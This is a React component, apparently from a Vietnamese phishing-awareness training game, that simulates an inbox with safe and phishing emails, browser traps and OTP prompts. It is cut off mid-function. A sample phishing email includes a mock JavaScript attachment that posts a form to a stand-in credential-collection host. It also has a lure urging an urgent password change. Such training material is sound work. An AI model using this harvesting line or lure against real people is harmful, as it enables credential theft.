import { useCallback, useEffect, useMemo, useRef, useState } from 'react'
import { Link, useLocation, useNavigate, useParams } from 'react-router-dom'
import Draggable from 'react-draggable'
import { ArrowLeft, Network, ShieldAlert } from 'lucide-react'
import * as scenarioService from '../../services/scenarioService.js'
import * as sessionService from '../../services/sessionService.js'
import FakeBrowserWindow from './playModes/FakeBrowserWindow.jsx'
import FakeZaloPanel from './playModes/FakeZaloPanel.jsx'
import CompanyPolicy from './playModes/CompanyPolicy.jsx'
import OtpChallengePanel, { MIN_OTP_LEN } from './playModes/OtpChallengePanel.jsx'
import MailAttachmentSimulator from './MailAttachmentSimulator.jsx'
import PhoneOtpWidget from './playModes/PhoneOtpWidget.jsx'
import { GameStateProvider, useGameState } from './state/GameStateContext.jsx'
import { normalizeScenarioContent } from './utils/contentSchema.js'
import DebriefOverlayPanel from './DebriefOverlayPanel.jsx'
import TeachableMomentOverlay from './TeachableMomentOverlay.jsx'
import { AppWindow, DesktopEnvironment } from './windows/DesktopShell.jsx'
import GmailWindow from './windows/GmailWindow.jsx'

const SCORE_CORRECT = 120
const SCORE_FALSE_REPORT = 120
const WEB_CREDENTIALS = {
  FACEBOOK: { user: 'admin_fanpage@cybershield.vn', pass: 'fb@admin2026' },
  GOOGLE: { user: 'data_share@cybershield.vn', pass: 'drive_secure_99!' },
  GITHUB: { user: 'dev_lead@cybershield.vn', pass: 'Git!P@ss2026' },
  MICROSOFT: { user: 'nhanvien@cybershield.vn', pass: 'Ms365@Office!' },
  FINANCE: { user: 'ketoan01', pass: 'K3t0an@2026' },
}
function resolveWebTypeFromEmail(email, fallbackType) {
  const direct = String(email?.webType || '').toUpperCase().trim()
  if (direct && WEB_CREDENTIALS[direct]) return direct
  const token = `${email?.linkUrl || ''} ${email?.senderEmail || ''} ${email?.subject || ''}`.toLowerCase()
  if (token.includes('facebook')) return 'FACEBOOK'
  if (token.includes('google') || token.includes('drive')) return 'GOOGLE'
  if (token.includes('github')) return 'GITHUB'
  if (token.includes('finance') || token.includes('ketoan')) return 'FINANCE'
  if (token.includes('microsoft') || token.includes('office') || token.includes('outlook')) return 'MICROSOFT'
  const fallback = String(fallbackType || 'MICROSOFT').toUpperCase().trim()
  return WEB_CREDENTIALS[fallback] ? fallback : 'MICROSOFT'
}

function playStampTone(isDanger) {
  try {
    const ctx = new window.AudioContext()
    const osc = ctx.createOscillator()
    const gain = ctx.createGain()
    osc.type = 'square'
    osc.frequency.value = isDanger ? 175 : 420
    gain.gain.value = 0.09
    osc.connect(gain)
    gain.connect(ctx.destination)
    osc.start()
    osc.stop(ctx.currentTime + 0.09)
  } catch {
    // best-effort audio feedback
  }
}

function buildQueueBySession(lesson, campaignTitle) {
  const threat = Math.max(1, Math.min(5, Number(lesson?.threatLevel) || 1))
  const lessonTitle = lesson?.lessonTitle || 'Bài học mô phỏng'
  const objective = lesson?.objective || 'Kiểm tra người gửi, ngữ cảnh và đường link.'
  const topic = lessonTitle.replace(/^Bài\s*\d+:\s*/i, '')

  const safe = {
    id: `${lesson?.sessionId}-safe`,
    senderName: 'HR Department',
    senderEmail: 'hr@cybershield-academy.internal',
    subject: `Thông báo nội bộ: ${topic}`,
    body: `Xin chào,\n\nNội dung hôm nay: ${objective}\n\nVui lòng theo dõi lịch học trên cổng nội bộ.`,
    linkLabel: 'Mở cổng đào tạo nội bộ',
    linkUrl: 'https://intranet.cybershield-academy.internal/training',
    isPhishing: false,
    redFlags: [],
  }

  const phishing = {
    id: `${lesson?.sessionId}-phish`,
    senderName: 'HR Department',
    senderEmail: `hr-admin@freemail-xyz.com`,
    subject: `Gấp: Cập nhật hồ sơ nhân sự cho ${campaignTitle}`,
    body: `Kính gửi nhân viên,\n\nBạn cần xác minh hồ sơ trong vòng 10 phút để tránh khóa tài khoản.\n\nBấm vào nút dưới để hoàn tất ngay.`,
    linkLabel: 'Đổi mật khẩu',
    linkUrl: `http://phishing-site.net/login?t=${threat}&sid=${lesson?.sessionId}`,
    isPhishing: true,
    redFlags: [
      'Tên hiển thị giống nội bộ nhưng domain người gửi là freemail.',
      'Yêu cầu hành động gấp để tạo áp lực tâm lý.',
      'Link đích là HTTP và domain ngoài hệ thống.',
    ],
    attachmentJson: JSON.stringify({
      fileName: 'VerifyAccount.js',
      mimeLabel: 'JavaScript',
      viewerTitle: 'Notepad — nội dung file (fallback demo)',
      content:
        '// Auto-verify script (mô phỏng)\ndocument.write("<form action=\\"http://evil-collect.net/creds\\">");\n// Luôn mở file trước khi tin — kể cả khi URL/sender trông ổn.',
      fileWarnings: [
        'File .js gửi form tới domain lạ',
        'Mã có thể độc hại dù link trong email trông giống thật',
      ],
    }),
  }

  const safe2 = {
    id: `${lesson?.sessionId}-safe2`,
    senderName: 'IT Helpdesk',
    senderEmail: 'helpdesk@cybershield-academy.internal',
    subject: `Checklist bảo mật - ${topic}`,
    body: `Mẹo nhanh: luôn hover link trước khi click.\nKhông chia sẻ OTP, mật khẩu qua email/chat.`,
    linkLabel: 'Xem Security Handbook',
    linkUrl: 'https://intranet.cybershield-academy.internal/handbook',
    isPhishing: false,
    redFlags: [],
  }

  return threat >= 3 ? [safe, phishing, safe2] : [safe, safe2, phishing]
}

function mapApiInboxToQueue(rows) {
  if (!Array.isArray(rows)) return []
  return rows.map((row) => ({
    id: row.id,
    senderName: row.senderName || '',
    senderEmail: row.senderEmail,
    subject: row.subject,
    body: row.body,
    linkUrl: row.linkUrl,
    linkLabel: row.linkLabel || 'Link',
    isPhishing: Boolean(row.isPhishing),
    redFlags: row.redFlags || [],
    slotTag: row.slotTag,
    sortOrder: row.sortOrder,
    attachmentJson: row.attachmentJson || null,
  }))
}

function SurvivalInboxScreen() {
  const { sessionId: stepId } = useParams()
  const location = useLocation()
  const navigate = useNavigate()
  const { state: gameState, actions: gameActions } = useGameState()
  const [isLoading, setIsLoading] = useState(true)
  const [error, setError] = useState('')
  const [campaignTitle, setCampaignTitle] = useState('Chiến dịch huấn luyện')
  const [scenarioRouteId, setScenarioRouteId] = useState('')
  const [lesson, setLesson] = useState(null)
  const [queue, setQueue] = useState([])
  const [index, setIndex] = useState(0)
  const [score, setScore] = useState(0)
  const scoreRef = useRef(0)
  const [status, setStatus] = useState('PLAYING')
  const [senderTooltipOpen, setSenderTooltipOpen] = useState(false)
  const [hoveredUrl, setHoveredUrl] = useState('')
  const [gameOverEmail, setGameOverEmail] = useState(null)
  const [gameOverNonMail, setGameOverNonMail] = useState(false)
  const [playContext, setPlayContext] = useState(null)
  const [openedAttachmentIds, setOpenedAttachmentIds] = useState([])
  const [attachmentModalOpen, setAttachmentModalOpen] = useState(false)
  const [isShaking, setIsShaking] = useState(false)
  const [decisionHistory, setDecisionHistory] = useState([])
  const [startedAtMs, setStartedAtMs] = useState(() => Date.now())
  const [isFinished, setIsFinished] = useState(false)
  const [isSubmittingResult, setIsSubmittingResult] = useState(false)
  const [debriefData, setDebriefData] = useState(null)
  const hasSubmittedRef = useRef(false)
  const pendingTrapDecisionRef = useRef(null)
  const deferredDebriefRef = useRef(null)
  /** MAIL_OTP: cặp OTP nhập / đúng tại thời điểm gửi trap (state cuối email có thể sai khi nộp bài). */
  const mailOtpSnapshotRef = useRef(null)
  const otpByEmailRef = useRef({})
  const otpTrapBusyRef = useRef(false)
  const [otpTrapBusy, setOtpTrapBusy] = useState(false)
  const webTrapSubmittedEmailRef = useRef(null)
  const [webTrapBusy, setWebTrapBusy] = useState(false)
  const [scenarioModel, setScenarioModel] = useState(null)
  const [browserUser, setBrowserUser] = useState('')
  const [browserPass, setBrowserPass] = useState('')
  const [browserOtp, setBrowserOtp] = useState('')
  const [generatedOtp, setGeneratedOtp] = useState('')
  const [activeApp, setActiveApp] = useState('mail')
  const [windowZ, setWindowZ] = useState({
    mail: 120,
    notepad: 90,
    policy: 88,
    chat: 86,
    browser: 130,
  })
  const mailWindowNodeRef = useRef(null)
  const notepadWindowNodeRef = useRef(null)
  const chatWindowNodeRef = useRef(null)
  const policyWindowNodeRef = useRef(null)
  const browserWindowNodeRef = useRef(null)
  const zaloSubmittedEmailRef = useRef(null)
  const zCounterRef = useRef(140)
  const loadRequestSeqRef = useRef(0)

  const routeScenarioIdHint = useMemo(() => {
    const raw = location?.state?.scenarioId
    if (!raw) return ''
    return String(raw)
  }, [location?.state?.scenarioId])

  const routeCampaignTitleHint = useMemo(() => {
    const raw = location?.state?.campaignTitle
    if (!raw) return ''
    return String(raw)
  }, [location?.state?.campaignTitle])

  const routeLessonHint = useMemo(() => {
    const raw = location?.state?.lesson
    if (!raw || typeof raw !== 'object') return null
    if (String(raw?.sessionId ?? '') !== String(stepId ?? '')) return null
    return raw
  }, [location?.state?.lesson, stepId])

  const bringToFront = useCallback((key) => {
    if (!key) return
    zCounterRef.current += 1
    const next = zCounterRef.current
    setWindowZ((prev) => ({ ...prev, [key]: next }))
    setActiveApp(key)
  }, [])

  const currentEmail = queue[index] ?? null
  const currentEmailNumericId = useMemo(() => {
    const rawId = currentEmail?.id
    return typeof rawId === 'number' ? rawId : Number.parseInt(String(rawId), 10) || null
  }, [currentEmail?.id])
  const attachmentSpec = useMemo(() => {
    if (!currentEmail?.attachmentJson) return null
    try {
      return JSON.parse(currentEmail.attachmentJson)
    } catch {
      return null
    }
  }, [currentEmail?.attachmentJson])
  const scenarioType = scenarioModel?.scenarioType || 'MAIL_STANDARD'
  const isMailOtpScenario = scenarioType === 'MAIL_OTP'
  const policyRules = useMemo(() => {
    if (Array.isArray(scenarioModel?.policyRules) && scenarioModel.policyRules.length > 0) {
      return scenarioModel.policyRules
    }
    try {
      const parsed = JSON.parse(playContext?.content || '{}')
      return Array.isArray(parsed?.policyRules) ? parsed.policyRules : []
    } catch {
      return []
    }
  }, [playContext?.content, scenarioModel?.policyRules])
  const isCurrentEmailOtpScenario = useMemo(() => {
    if (!isMailOtpScenario || !currentEmail) return false
    const formFromModel = String(scenarioModel?.traps?.browser?.formType || '').toUpperCase()
    const formFromTrap = String(gameState.trap.browserFormType || '').toUpperCase()
    if (formFromModel === 'OTP' || formFromTrap === 'OTP') return true
    const tag = String(currentEmail.slotTag || '').toUpperCase()
    if (tag.includes('OTP')) return true
    return isMailOtpScenario
  }, [
    currentEmail,
    gameState.trap.browserFormType,
    isMailOtpScenario,
    scenarioModel?.traps?.browser?.formType,
  ])
  const showPhoneOtpPreview =
    gameState.ui.isBrowserOpen &&
    isCurrentEmailOtpScenario &&
    gameState.ui.isPhoneWidgetVisible
  const appWindowTitle = 'Inbox - hr.department@company.com - Google Chrome'
  const completedCount = Math.min(Math.max(index, decisionHistory.length), queue.length)
  const queueLen = queue.length
  const progressPct = queue.length ? Math.round((completedCount / queue.length) * 100) : 0
  const threatLevel = lesson?.threatLevel ?? 1
  const canAct = status === 'PLAYING' && !!currentEmail
  const canVerifyMail =
    canAct &&
    (!attachmentSpec ||
      openedAttachmentIds.some((id) => String(id) === String(currentEmail?.id)))
  const canTrustBrowserTrap = isMailOtpScenario
    ? browserOtp.trim().length >= MIN_OTP_LEN && !otpTrapBusy
    : browserUser.trim().length > 0 && browserPass.trim().length > 0 && !webTrapBusy
  const activeBrowserTrap = useMemo(() => {
    const traps = scenarioModel?.traps?.browser?.emailTraps
    if (!Array.isArray(traps) || !currentEmail) return null
    const order = Number(currentEmail?.sortOrder)
    if (!Number.isFinite(order)) return null
    const matched = traps.find((trap) => Number(trap?.sortOrder) === order)
    return matched || null
  }, [currentEmail, scenarioModel?.traps?.browser?.emailTraps])
  const activeWebType = useMemo(
    () =>
      resolveWebTypeFromEmail(
        currentEmail,
        activeBrowserTrap?.webType || scenarioModel?.traps?.browser?.webType,
      ),
    [activeBrowserTrap?.webType, currentEmail, scenarioModel?.traps?.browser?.webType],
  )
  const ensureOtpForEmail = useCallback((emailId) => {
    if (emailId == null) return ''
    const key = String(emailId)
    const existing = otpByEmailRef.current[key]
    if (existing) return existing
    const otp = Math.floor(100000 + Math.random() * 900000).toString()
    otpByEmailRef.current[key] = otp
    return otp
  }, [])
  const policySections = useMemo(() => {
    if (Array.isArray(scenarioModel?.policySections) && scenarioModel.policySections.length > 0) {
      return scenarioModel.policySections
    }
    try {
      const parsed = JSON.parse(playContext?.content || '{}')
      return Array.isArray(parsed?.policySections) ? parsed.policySections : []
    } catch {
      return []
    }
  }, [playContext?.content, scenarioModel?.policySections])
  const zaloVerifyConfig = useMemo(() => {
    if (scenarioType !== 'MAIL_ZALO') {
      return {
        required: true,
        autoReply: 'Dạ em đã xác nhận theo quy trình nội bộ.',
        sender: 'Liên hệ',
        messages: [],
      }
    }
    try {
      const parsed = JSON.parse(playContext?.content || '{}')
      const caseMap = Array.isArray(parsed?.caseMap) ? parsed.caseMap : []
      const order = Number(currentEmail?.sortOrder)
      const activeCase = Number.isFinite(order)
        ? caseMap.find((item) => Number(item?.sortOrder) === order) || null
        : null
      const required =
        typeof activeCase?.zaloVerifyRequired === 'boolean'
          ? activeCase.zaloVerifyRequired
          : typeof parsed?.zaloVerifyRequired === 'boolean'
            ? parsed.zaloVerifyRequired
            : !Boolean(currentEmail?.isPhishing)
      const autoReply =
        String(activeCase?.zaloAutoReply || parsed?.zaloAutoReply || 'Dạ em đã xác nhận theo quy trình nội bộ.')
          .trim() || 'Dạ em đã xác nhận theo quy trình nội bộ.'
      const messages = Array.isArray(activeCase?.messages)
        ? activeCase.messages
        : Array.isArray(parsed?.messages)
          ? parsed.messages
          : []
      const sender = activeCase?.sender || parsed?.sender || 'Liên hệ'
      return { required, autoReply, sender, messages }
    } catch {
      return {
        required: !Boolean(currentEmail?.isPhishing),
        autoReply: 'Dạ em đã xác nhận theo quy trình nội bộ.',
        sender: 'Liên hệ',
        messages: [],
      }
    }
  }, [currentEmail?.isPhishing, currentEmail?.sortOrder, playContext?.content, scenarioType])
  const activeZaloContent = useMemo(() => {
    if (scenarioType !== 'MAIL_ZALO') return playContext?.content
    try {
      const parsed = JSON.parse(playContext?.content || '{}')
      const merged = {
        ...parsed,
        sender: zaloVerifyConfig.sender,
        messages: zaloVerifyConfig.messages,
      }
      return JSON.stringify(merged)
    } catch {
      return playContext?.content
    }
  }, [playContext?.content, scenarioType, zaloVerifyConfig.messages, zaloVerifyConfig.sender])
  const notepadContent = useMemo(() => {
    const rows = [
      ['Facebook Fanpage', 'facebook.com/cybershield', WEB_CREDENTIALS.FACEBOOK],
      ['Google Drive', 'drive.google.com', WEB_CREDENTIALS.GOOGLE],
      ['GitHub', 'github.com', WEB_CREDENTIALS.GITHUB],
      ['Microsoft 365', 'login.microsoftonline.com', WEB_CREDENTIALS.MICROSOFT],
      ['Finance', 'finance.cybershield.internal', WEB_CREDENTIALS.FINANCE],
    ]
    return rows
      .map(
        (row, idx) => `${idx + 1}. ${row[0]}
URL: ${row[1]}
User: ${row[2].user}
Pass: ${row[2].pass}`,
      )
      .join('\n\n')
  }, [])
  const notepadDefaultPosition = useMemo(() => {
    if (typeof window === 'undefined') return { x: 20, y: 390 }
    return { x: 20, y: 390 }
  }, [])
  const flow5Layout = useMemo(() => {
    if (typeof window === 'undefined') {
      return {
        gmail: { x: 400, y: 50 },
        policy: { x: 20, y: 20 },
        notepad: { x: 20, y: 400 },
        chat: { x: 1000, y: 50 },
      }
    }
    const width = window.innerWidth
    const height = window.innerHeight
    const gmailWidth = 920
    const gmailHeight = 640
    const chatWidth = 350
    const policyHeight = 360
    const notepadHeight = 360
    const leftX = 20
    const topY = 20
    const gmailX = Math.max(220, Math.min(400, width - gmailWidth - 20))
    const gmailY = Math.max(20, Math.min(50, height - gmailHeight - 70))
    const chatX = Math.max(380, Math.min(width - chatWidth - 20, 1000))
    const chatY = Math.max(20, Math.min(50, height - 550 - 70))
    const notepadY = Math.max(topY + policyHeight + 20, Math.min(400, height - notepadHeight - 70))
    return {
      gmail: { x: gmailX, y: gmailY },
      policy: { x: leftX, y: topY },
      notepad: { x: leftX, y: notepadY },
      chat: { x: chatX, y: chatY },
    }
  }, [])

  const appendTrapVerifiedDecision = useCallback(() => {
    const rawId = currentEmail?.id
    const emailId =
      typeof rawId === 'number' ? rawId : Number.parseInt(String(rawId), 10) || index + 1
    const decision = {
      emailId,
      isPhishing: true,
      userAction: 'VERIFIED',
    }
    pendingTrapDecisionRef.current = decision
    setDecisionHistory((prev) => {
      if (
        prev.some(
          (item) => String(item.emailId) === String(decision.emailId) && item.userAction === decision.userAction,
        )
      ) {
        return prev
      }
      return [...prev, decision]
    })
    gameActions.commitDecision('VERIFIED')
  }, [currentEmail?.id, gameActions, index])

  const loadBySessionId = useCallback(async (opts = {}) => {
    const forceRefresh = Boolean(opts?.forceRefresh)
    const requestSeq = ++loadRequestSeqRef.current
    hasSubmittedRef.current = false
    pendingTrapDecisionRef.current = null
    otpTrapBusyRef.current = false
    webTrapSubmittedEmailRef.current = null
    setOtpTrapBusy(false)
    setWebTrapBusy(false)
    if (!stepId) {
      setError('Thiếu stepId trên URL.')
      setIsLoading(false)
      return
    }
    try {
      setIsLoading(true)
      setError('')
      setSenderTooltipOpen(false)
      setHoveredUrl('')
      let foundScenario = null
      let foundLesson = routeLessonHint

      if (routeScenarioIdHint) {
        const [scenarioRes, lessonsRes] = await Promise.all([
          scenarioService.getScenarioById(routeScenarioIdHint, { forceRefresh }),
          sessionService.fetchSessionsByScenario(routeScenarioIdHint, { forceRefresh }),
        ])
        if (requestSeq !== loadRequestSeqRef.current) return
        foundScenario = scenarioRes?.data ?? null
        if (!foundLesson) {
          const lessons = Array.isArray(lessonsRes?.data) ? lessonsRes.data : []
          foundLesson = lessons.find((x) => String(x.sessionId) === String(stepId)) || null
        }
      } else {
        const { data: scenarios } = await scenarioService.getScenarios({ forceRefresh })
        if (requestSeq !== loadRequestSeqRef.current) return
        for (const scenario of Array.isArray(scenarios) ? scenarios : []) {
          const { data: lessons } = await sessionService.fetchSessionsByScenario(scenario.id, { forceRefresh })
          if (requestSeq !== loadRequestSeqRef.current) return
          const matched = Array.isArray(lessons)
            ? lessons.find((x) => String(x.sessionId) === String(stepId))
            : null
          if (matched) {
            foundScenario = scenario
            foundLesson = matched
            break
          }
        }
      }
      if (!foundLesson) throw new Error('Không tìm thấy session hợp lệ cho màn chơi.')
      if (requestSeq !== loadRequestSeqRef.current) return

      setCampaignTitle(foundScenario?.title || routeCampaignTitleHint || 'Chiến dịch huấn luyện')
      setScenarioRouteId(foundScenario?.id ? String(foundScenario.id) : '')
      setLesson(foundLesson)

      let playCtx = {
        stepType: 'MAIL',
        content: null,
        phishingScenario: false,
        landing: null,
      }
      try {
        const ctxRes = await sessionService.fetchPlayContext(stepId, { forceRefresh })
        if (requestSeq !== loadRequestSeqRef.current) return
        if (ctxRes?.data) {
          playCtx = { ...playCtx, ...ctxRes.data }
        }
      } catch {
        // Giữ mặc định MAIL nếu API lỗi.
      }
      setPlayContext(playCtx)

      const stepTypeNorm = (playCtx.stepType || 'MAIL').toString().toUpperCase()
      let nextQueue = []
      try {
        const inboxRes = await sessionService.fetchInboxEmailsForStep(stepId, { forceRefresh })
        if (requestSeq !== loadRequestSeqRef.current) return
        nextQueue = mapApiInboxToQueue(inboxRes.data)
      } catch {
        nextQueue = []
      }
      if (requestSeq !== loadRequestSeqRef.current) return
      if (nextQueue.length === 0) {
        nextQueue = buildQueueBySession(foundLesson, foundScenario?.title || 'CyberShield')
      }
      setQueue(nextQueue)
      const normalized = normalizeScenarioContent({
        stepType: stepTypeNorm,
        content: playCtx.content,
        queue: nextQueue,
      })
      setScenarioModel(normalized)
      gameActions.reset({
        isZaloActive: normalized.traps.zalo.enabled,
        isPhoneWidgetVisible: normalized.traps.otp.enabled,
      })
      setIndex(0)
      setScore(0)
      scoreRef.current = 0
      setStatus('PLAYING')
      setGameOverEmail(null)
      setGameOverNonMail(false)
      setOpenedAttachmentIds([])
      setAttachmentModalOpen(false)
      setDecisionHistory([])
      setStartedAtMs(Date.now())
      setIsFinished(false)
      setIsSubmittingResult(false)
      setDebriefData(null)
      setBrowserUser('')
      setBrowserPass('')
      setBrowserOtp('')
      otpByEmailRef.current = {}
      setGeneratedOtp('')
      setActiveApp('mail')
    } catch (err) {
      if (requestSeq !== loadRequestSeqRef.current) return
      setError(err?.response?.data?.message || err?.message || 'Không thể nạp dữ liệu màn chơi.')
      setScenarioRouteId('')
      setQueue([])
      setLesson(null)
      setPlayContext(null)
      setScenarioModel(null)
    } finally {
      if (requestSeq === loadRequestSeqRef.current) {
        setIsLoading(false)
      }
    }
  }, [routeCampaignTitleHint, routeLessonHint, routeScenarioIdHint, stepId])

  useEffect(() => {
    loadBySessionId()
    return () => {
      loadRequestSeqRef.current += 1
    }
  }, [loadBySessionId])

  useEffect(() => {
    setAttachmentModalOpen(false)
    setBrowserUser('')
    setBrowserPass('')
    setBrowserOtp('')
    gameActions.setPhoneWidgetVisible(false)
    webTrapSubmittedEmailRef.current = null
    zaloSubmittedEmailRef.current = null
    setWebTrapBusy(false)
    if (isMailOtpScenario && currentEmailNumericId != null) {
      const existingOtp = otpByEmailRef.current[String(currentEmailNumericId)] || ''
      setGeneratedOtp(existingOtp)
    } else {
      setGeneratedOtp('')
    }
    // Only reset on question boundary; omit gameActions from deps (link click changes its identity and would hide the widget).
  }, [index, isMailOtpScenario, currentEmailNumericId])

  const submitResult = useCallback(async (opts = {}) => {
    const deferDebrief = Boolean(opts?.deferDebrief)
    const immediateDecisions = Array.isArray(opts?.immediateDecisions) ? opts.immediateDecisions : []
    if (!stepId || isSubmittingResult) return
    try {
      setIsSubmittingResult(true)
      const timeTakenSeconds = Math.max(1, Math.round((Date.now() - startedAtMs) / 1000))
      const st = (playContext?.stepType || 'MAIL').toString().toUpperCase()
      const baseHistory = decisionHistory
      const mergedHistory = [...baseHistory]
      for (const d of immediateDecisions) {
        if (!d) continue
        if (mergedHistory.some((x) => String(x?.emailId ?? '') === String(d?.emailId ?? '') && x?.userAction === d?.userAction)) {
          continue
        }
        mergedHistory.push(d)
      }
      if (pendingTrapDecisionRef.current) {
        const pending = pendingTrapDecisionRef.current
        if (
          !mergedHistory.some(
            (item) => String(item?.emailId ?? '') === String(pending?.emailId ?? '') && item?.userAction === pending?.userAction,
          )
        ) {
          mergedHistory.push(pending)
        }
      }
      const finalEmailDecisions = mergedHistory
      const payload = {
        finalScore: scoreRef.current,
        timeTakenSeconds,
      }
      const canMapToEmailDecisions = finalEmailDecisions.length > 0
      if (st === 'MAIL_OTP') {
        const snap = mailOtpSnapshotRef.current
        const otpEntered = snap?.entered != null ? snap.entered : browserOtp.trim()
        const otpExpected = snap?.expected != null ? snap.expected : generatedOtp
        payload.emailDecisions = finalEmailDecisions.map((decision) => {
          const row = {
            emailId: decision.emailId,
            isPhishing: decision.isPhishing,
            userAction: decision.userAction,
          }
          if (decision.payload != null || decision.expectedPayload != null) {
            row.payload = decision.payload
            row.expectedPayload = decision.expectedPayload
          } else if (
            snap &&
            decision.userAction === 'VERIFIED' &&
            String(decision.emailId) === String(snap.emailId)
          ) {
            row.payload = otpEntered
            row.expectedPayload = otpExpected
          }
          return row
        })
        payload.gameplayDecisions = [
          {
            decisionType: 'OTP_SUBMIT',
            userAction: 'OTP_SUBMIT',
            isPhishing: false,
            payload: otpEntered,
            expectedPayload: otpExpected,
          },
        ]
      } else if (st === 'MAIL' || canMapToEmailDecisions) {
        payload.emailDecisions = finalEmailDecisions.map((decision) => {
          const row = {
            emailId: decision.emailId,
            isPhishing: decision.isPhishing,
            userAction: decision.userAction,
          }
          if (decision.payload != null) row.payload = decision.payload
          if (decision.expectedPayload != null) row.expectedPayload = decision.expectedPayload
          return row
        })
      } else {
        const normalizedType =
          st === 'WEB_PAGE' ? 'BROWSER_VERDICT' : st === 'OTP' ? 'OTP_SUBMIT' : 'ZALO_VERDICT'
        payload.gameplayDecisions = mergedHistory.map((decision) => ({
          decisionType: normalizedType,
          userAction: decision.userAction,
          isPhishing: decision.isPhishing,
          payload:
            st === 'OTP'
              ? browserOtp.trim() || generatedOtp || undefined
              : undefined,
        }))
      }
      const { data } = await sessionService.submitGameplayStep(stepId, payload)
      const report = {
        ...data,
        timeTakenSeconds,
        finalScore: scoreRef.current,
      }
      if (deferDebrief) {
        deferredDebriefRef.current = report
      } else {
        setDebriefData(report)
      }
    } catch (err) {
      const errorMessage = err?.response?.data?.message || err?.message || 'Lỗi không xác định'
      const report = {
        earnedExp: 0,
        totalExp: 0,
        isPassed: false,
        feedbackMessages: [
          `[LỖI KẾT NỐI] Không thể nộp bài. Chi tiết: ${errorMessage}`,
          '[HỆ THỐNG] Lỗi API (403 Forbidden). Hãy kiểm tra JWT Token. Vui lòng F5 lại trang.',
        ],
        timeTakenSeconds: Math.max(1, Math.round((Date.now() - startedAtMs) / 1000)),
        finalScore: scoreRef.current,
      }
      if (deferDebrief) {
        deferredDebriefRef.current = report
      } else {
        setDebriefData(report)
      }
    } finally {
      pendingTrapDecisionRef.current = null
      setIsSubmittingResult(false)
    }
  }, [
    browserOtp,
    decisionHistory,
    generatedOtp,
    isSubmittingResult,
    playContext?.stepType,
    startedAtMs,
    stepId,
  ])

  useEffect(() => {
    if (isFinished && !hasSubmittedRef.current) {
      hasSubmittedRef.current = true
      submitResult()
    }
  }, [isFinished, submitResult])

  useEffect(() => {
    if (status !== 'GAME_OVER') return
    if (gameOverEmail || gameOverNonMail) return
    if (gameState.trap.isPhished) {
      setGameOverNonMail(true)
      return
    }
    if (currentEmail?.isPhishing) {
      setGameOverEmail(currentEmail)
      setGameOverNonMail(true)
    }
  }, [currentEmail, gameOverEmail, gameOverNonMail, gameState.trap.isPhished, status])

  const handleCloseBrowser = useCallback(() => {
    gameActions.setPhoneWidgetVisible(false)
    gameActions.closeBrowser()
  }, [gameActions])

  const handleEmailDecision = useCallback(
    (action, options = {}) => {
      if (!canAct) return
      const isReport = action === 'QUARANTINE'
      const isVerified = action === 'VERIFIED'
      const bypassAttachmentGate = Boolean(options?.bypassAttachmentGate)
      if (!isReport && !isVerified) return
      if (
        isVerified &&
        attachmentSpec &&
        !bypassAttachmentGate &&
        !openedAttachmentIds.some((id) => String(id) === String(currentEmail?.id))
      ) {
        setIsShaking(true)
        window.setTimeout(() => setIsShaking(false), 220)
        return
      }
      if (
        isVerified &&
        scenarioModel?.traps?.browser?.enabled &&
        !gameActions.getInspectedLinks().includes(`email-link-${currentEmail?.id}`)
      ) {
        setIsShaking(true)
        window.setTimeout(() => setIsShaking(false), 220)
        return
      }
      setSenderTooltipOpen(false)
      setHoveredUrl('')
      setIsShaking(true)
      playStampTone(isReport)

      window.setTimeout(() => {
        const rawId = currentEmail?.id
        const emailId =
          typeof rawId === 'number' ? rawId : Number.parseInt(String(rawId), 10) || index + 1
        const decision = {
          emailId,
          isPhishing: Boolean(currentEmail?.isPhishing),
          userAction: action,
        }
        gameActions.commitDecision(decision.userAction)
        setDecisionHistory((prev) => [...prev, decision])

        const trustPhishing = isVerified && currentEmail?.isPhishing
        if (trustPhishing) {
          setStatus('GAME_OVER')
          setGameOverEmail(currentEmail)
          setGameOverNonMail(false)
          setIsFinished(false)
          setIsShaking(false)
          return
        }

        const correct = (isReport && currentEmail?.isPhishing) || (isVerified && !currentEmail?.isPhishing)
        const nextScore = scoreRef.current + (correct ? SCORE_CORRECT : -SCORE_FALSE_REPORT)
        scoreRef.current = nextScore
        setScore(nextScore)

        const nextIndex = index + 1
        if (nextIndex >= queue.length) {
          setStatus(nextScore < 0 ? 'GAME_OVER' : 'VICTORY')
          if (nextScore < 0) {
            setGameOverEmail(null)
          }
          setIsFinished(true)
        } else {
          setIndex(nextIndex)
        }
        setIsShaking(false)
      }, 170)
    },
    [
      attachmentSpec,
      canAct,
      currentEmail,
      gameActions,
      index,
      openedAttachmentIds,
      queue.length,
      scenarioModel?.traps?.browser?.enabled,
    ],
  )

  const handleLinkClick = useCallback(
    (url) => {
      if (!currentEmail) return
      const resolvedUrl =
        !url || url === '#'
          ? activeBrowserTrap?.actualUrl ||
            scenarioModel?.traps?.browser?.actualUrl ||
            scenarioModel?.traps?.browser?.displayUrl
          : url
      const shouldOpenBrowserTrap =
        scenarioModel?.traps?.browser?.enabled ||
        scenarioType === 'MAIL_WEB' ||
        isMailOtpScenario ||
        (Boolean(currentEmail?.isPhishing) && Boolean(resolvedUrl))
      if (!shouldOpenBrowserTrap) return
      if (isMailOtpScenario) {
        const otpForCurrentEmail = ensureOtpForEmail(currentEmailNumericId)
        setGeneratedOtp(otpForCurrentEmail)
        gameActions.setPhoneWidgetVisible(true)
      }

      const trapId = `email-link-${currentEmail?.id ?? 'unknown'}`
      gameActions.markInspectedLink(trapId)
      gameActions.openBrowser({
        url: resolvedUrl,
        trapId,
        formType: isMailOtpScenario ? 'OTP' : scenarioModel?.traps?.browser?.formType || 'CREDENTIAL',
      })
      // Ensure browser window jumps above Gmail right when opened.
      bringToFront('browser')
      setActiveApp('browser')
    },
    [activeBrowserTrap?.actualUrl, bringToFront, currentEmail, currentEmailNumericId, ensureOtpForEmail, gameActions, isMailOtpScenario, scenarioModel, scenarioType],
  )

  const handleFileDownload = useCallback(
    () => {
      if (currentEmail?.id != null) {
        gameActions.markInspectedAttachment(currentEmail.id)
      }
      setAttachmentModalOpen(true)
    },
    [currentEmail?.id, gameActions],
  )

  const handleAttachmentDownload = useCallback(() => {
    setAttachmentModalOpen(false)
    if (!currentEmail) return
    if (currentEmail?.isPhishing) {
      appendTrapVerifiedDecision()
      setStatus('GAME_OVER')
      setGameOverEmail(currentEmail)
      setGameOverNonMail(true)
      setIsFinished(false)
      return
    }
    if (currentEmail?.id != null) {
      gameActions.markInspectedAttachment(currentEmail.id)
    }
    setOpenedAttachmentIds((prev) => {
      const id = currentEmail?.id
      if (id == null) return prev
      if (prev.some((x) => String(x) === String(id))) return prev
      return [...prev, id]
